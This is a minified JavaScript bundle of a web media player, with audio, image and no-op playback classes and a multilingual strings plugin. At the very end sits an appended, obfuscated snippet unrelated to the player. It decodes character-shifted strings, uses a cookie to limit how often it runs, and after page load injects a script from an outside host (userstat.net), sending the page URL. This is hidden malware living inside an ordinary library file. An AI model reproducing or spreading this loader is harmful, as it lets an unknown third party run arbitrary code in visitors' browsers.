this.name===l.prototype.name}},{key:"closedCaptionsTracks",get:function(){var t=0;return(this.el.textTracks?Array.from(this.el.textTracks):[]).filter((function(e){return"subtitles"===e.kind||"captions"===e.kind})).map((function(e){return{id:t++,name:e.label,track:e}}))}},{key:"closedCaptionsTrackId",get:function(){return this._ccTrackId},set:function(t){if(jt(t)){var e,r=this.closedCaptionsTracks;if(-1!==t){if(!(e=r.find((function(e){return e.id===t}))))return;if("showing"===e.track.mode)return}r.filter((function(e){return"hidden"!==e.track.mode})).forEach((function(e){return e.track.mode="hidden"})),e&&(e.track.mode="showing"),this._ccTrackId=t,this.trigger(P.PLAYBACK_SUBTITLE_CHANGED,{id:t})}}},{key:"template",get:function(){return $t('<% for (var i = 0; i < tracks.length; i++) { %>\n  <track data-html5-video-track="<%= i %>" kind="<%= tracks[i].kind %>" label="<%= tracks[i].label %>" srclang="<%= tracks[i].lang %>" src="<%= tracks[i].src %>">\n<% }; %>\n')}}]),l}(),Ir=(e=(M._mimeTypesForUrl=function(e,t,r){return e=(e.split("?")[0].match(/.*\.(.*)$/)||[])[1],(r=r||e&&t[e.toLowerCase()]||[]).constructor===Array?r:[r]},M._canPlay=function(e,t,r,n){r=M._mimeTypesForUrl(r,t,n);var i=document.createElement(e);return!!r.filter((function(e){return!!i.canPlayType(e).replace(/no/,"")}))[0]},M.canPlay=function(e,t){return M._canPlay("audio",wr,e,t)||M._canPlay("video",Rr,e,t)},function(){c(t,M);var e=d(t);function t(){return u(this,t),e.apply(this,arguments)}return s(t,[{key:"updateSettings",value:function(){this.settings.left=["playpause","position","duration"],this.settings.seekEnabled=this.isSeekEnabled(),this.trigger(P.PLAYBACK_SETTINGSUPDATE)}},{key:"getPlaybackType",value:function(){return x.AOD}},{key:"name",get:function(){return"html5_audio"}},{key:"supportedVersion",get:function(){return{min:"0.4.19"}}},{key:"tagName",get:function(){return"audio"}},{key:"isAudioOnly",get:function(){return!0}}]),t}()),t=(e.canPlay=function(e,t){return M._canPlay("audio",{wav:["audio/wav"],mp3:["audio/mp3",'audio/mpeg;codecs="mp3"'],aac:['audio/mp4;codecs="mp4a.40.5"'],oga:["audio/ogg"]},e,t)},function(){c(n,x);var r=d(n);function n(e){var t;return u(this,n),(t=r.call(this,e)).el.src=e.src,t}return s(n,[{key:"getPlaybackType",value:function(){return x.NO_OP}},{key:"name",get:function(){return"html_img"}},{key:"supportedVersion",get:function(){return{min:"0.4.19"}}},{key:"tagName",get:function(){return"img"}},{key:"attributes",get:function(){return{"data-html-img":""}}},{key:"events",get:function(){return{load:"_onLoad",abort:"_onError",error:"_onError"}}}]),s(n,[{key:"render",value:function(){var e=dr.getStyleFor("[data-html-img] {\n  max-width: 100%;\n  max-height: 100%; }\n".toString(),{baseUrl:this.options.baseUrl});return this.$el.append(e[0]),this.trigger(P.PLAYBACK_READY,this.name),this}},{key:"_onLoad",value:function(){this.trigger(P.PLAYBACK_ENDED,this.name)}},{key:"_onError",value:function(e){e="error"===e.type?"load error":"loading aborted",this.trigger(P.PLAYBACK_ERROR,{message:e},this.name)}}]),n}()),t.canPlay=function(e){return/\.(png|jpg|jpeg|gif|bmp|tiff|pgm|pnm|webp)(|\?.*)$/i.test(e)},function(){c(a,x);var i=d(a);function a(){var e;u(this,a);for(var t=arguments.length,r=new Array(t),n=0;n<t;n++)r[n]=arguments[n];return(e=i.call.apply(i,[this].concat(r)))._noiseFrameNum=-1,e}return s(a,[{key:"name",get:function(){return"no_op"}},{key:"supportedVersion",get:function(){return{min:"0.4.19"}}},{key:"template",get:function(){return $t("<canvas data-no-op-canvas></canvas>\n<p data-no-op-msg><%=message%></p><p>\n</p>")}},{key:"attributes",get:function(){return{"data-no-op":""}}}]),s(a,[{key:"render",value:function(){var e=this.options.playbackNotSupportedMessage||this.i18n.t("playback_not_supported"),t=dr.getStyleFor("[data-no-op] {\n  position: absolute;\n  height: 100%;\n  width: 100%;\n  text-align: center; }\n\n[data-no-op] p[data-no-op-msg] {\n  position: absolute;\n  text-align: center;\n  font-size: 25px;\n  left: 0;\n  right: 0;\n  color: white;\n  padding: 10px;\n  /* center vertically */\n  top: 50%;\n  transform: translateY(-50%);\n  max-height: 100%;\n  overflow: auto; }\n\n[data-no-op] canvas[data-no-op-canvas] {\n  background-color: #777;\n  height: 100%;\n  width: 100%; }\n".toString(),{baseUrl:this.options.baseUrl});this.$el.append(t[0]),this.$el.html(this.template({message:e})),this.trigger(P.PLAYBACK_READY,this.name),t=!(!this.options.poster||!this.options.poster.showForNoOp);return!this.options.autoPlay&&t||this._animate(),this}},{key:"_noise",value:function(){if(this._noiseFrameNum=(this._noiseFrameNum+1)%5,!this._noiseFrameNum){var t=this.context.createImageData(this.context.canvas.width,this.context.canvas.height);try{r=new Uint32Array(t.data.buffer)}catch(e){for(var r=new Uint32Array(this.context.canvas.width*this.context.canvas.height*4),n=t.data,i=0;i<n.length;i++)r[i]=n[i]}for(var e=r.length,a=6*Math.random()+4,s=0,o=0,l=0;l<e;)s<0&&(s=a*Math.random(),o=255*Math.pow(Math.random(),.4)<<24),--s,r[l++]=o;this.context.putImageData(t,0,0)}}},{key:"_loop",value:function(){var e=this;this._stop||(this._noise(),this._animationHandle=Dt((function(){return e._loop()})))}},{key:"destroy",value:function(){this._animationHandle&&(Pt(this._animationHandle),this._stop=!0)}},{key:"_animate",value:function(){this.canvas=this.$el.find("canvas[data-no-op-canvas]")[0],this.context=this.canvas.getContext("2d"),this._loop()}}]),a}()),Dr=(Ir.canPlay=function(e){return!0},function(){c(r,Sr);var t=d(r);function r(e){return u(this,r),(e=t.call(this,e))._initializeMessages(),e}return s(r,[{key:"name",get:function(){return"strings"}},{key:"supportedVersion",get:function(){return{min:"0.4.19"}}}]),s(r,[{key:"t",value:function(e){var t=this._language(),r=this._messages.en;return(t&&this._messages[t]||r)[e]||r[e]||e}},{key:"_language",value:function(){return this.core.options.language||Gt()}},{key:"_initializeMessages",value:function(){this._messages=O.extend(!0,{en:{live:"live",back_to_live:"back to live",disabled:"Disabled",playback_not_supported:"Your browser does not support the playback of this video. Please try using a different browser.",default_error_title:"Could not play video.",default_error_message:"There was a problem trying to load the video."},de:{live:"Live",back_to_live:"Zurück zum Live-Video",disabled:"Deaktiviert",playback_not_supported:"Ihr Browser unterstützt das Playback Verfahren nicht. Bitte vesuchen Sie es mit einem anderen Browser.",default_error_title:"Video kann nicht abgespielt werden",default_error_message:"Es gab ein Problem beim Laden des Videos"},pt:{live:"ao vivo",back_to_live:"voltar para o ao vivo",disabled:"Desativado",playback_not_supported:"Seu navegador não supporta a reprodução deste video. Por favor, tente usar um navegador diferente.",default_error_title:"Não foi possível reproduzir o vídeo.",default_error_message:"Ocorreu um problema ao tentar carregar o vídeo."},es:{live:"vivo",back_to_live:"volver en vivo",disabled:"Discapacitado",playback_not_supported:"Su navegador no soporta la reproducción de un video. Por favor, trate de usar un navegador diferente."},ru:{live:"прямой эфир",back_to_live:"к прямому эфиру",disabled:"Отключено",playback_not_supported:"Ваш браузер не поддерживает воспроизведение этого видео. Пожалуйста, попробуйте другой браузер."},fr:{live:"en direct",back_to_live:"retour au direct",disabled:"Désactivé",playback_not_supported:"Votre navigateur ne supporte pas la lecture de cette vidéo. Merci de tenter sur un autre navigateur.",default_error_title:"Impossible de lire la vidéo.",default_error_message:"Un problème est survenu lors du chargement de la vidéo."},tr:{live:"canlı",back_to_live:"canlı yayına dön",disabled:"Engelli",playback_not_supported:"Tarayıcınız bu videoyu oynatma desteğine sahip değil. Lütfen farklı bir tarayıcı ile deneyin."},et:{live:"Otseülekanne",back_to_live:"Tagasi otseülekande juurde",disabled:"Keelatud",playback_not_supported:"Teie brauser ei toeta selle video taasesitust. Proovige kasutada muud brauserit."},ar:{live:"مباشر",back_to_live:"الرجوع إلى المباشر",disabled:"معطّل",playback_not_supported:"المتصفح الذي تستخدمه لا يدعم تشغيل هذا الفيديو. الرجاء إستخدام متصفح آخر.",default_error_title:"غير قادر الى التشغيل.",default_error_message:"حدثت مشكلة أثناء تحميل الفيديو."}},this.core.options.strings||{}),this._messages["de-DE"]=this._messages.de,this._messages["pt-BR"]=this._messages.pt,this._messages["en-US"]=this._messages.en,this._messages["es-419"]=this._messages.es,this._messages["fr-FR"]=this._messages.fr,this._messages["tr-TR"]=this._messages.tr,this._messages["et-EE"]=this._messages.et,this._messages["ar-IQ"]=this._messages.ar}}]),r}()),Pr=function(){c(t,Sr);var e=d(t);function t(){return u(this,t),e.apply(this,arguments)}return s(t,[{key:"bindEvents",value:function(){this.listenTo(this.core,P.CORE_CONTAINERS_CREATED,this.onContainersCreated)}},{key:"onContainersCreated",value:function(){var t=this.core.containers.filter((function(e){return"no_op"!==e.playback.name}))[0]||this.core.containers[0];t&&this.core.containers.forEach((function(e){e!==t&&e.destroy()}))}},{key:"name",get:function(){return"sources"}},{key:"supportedVersion",get:function(){return{min:"0.4.19"}}}]),t}();kr.registerPlugin(Dr),kr.registerPlugin(Pr),kr.registerPlayback(Ir),kr.registerPlayback(t),kr.registerPlayback(e),kr.registerPlayback(M)},89:function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill="#010101" d="M1.425.35L14.575 8l-13.15 7.65V.35z"></path></svg>'}}]);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));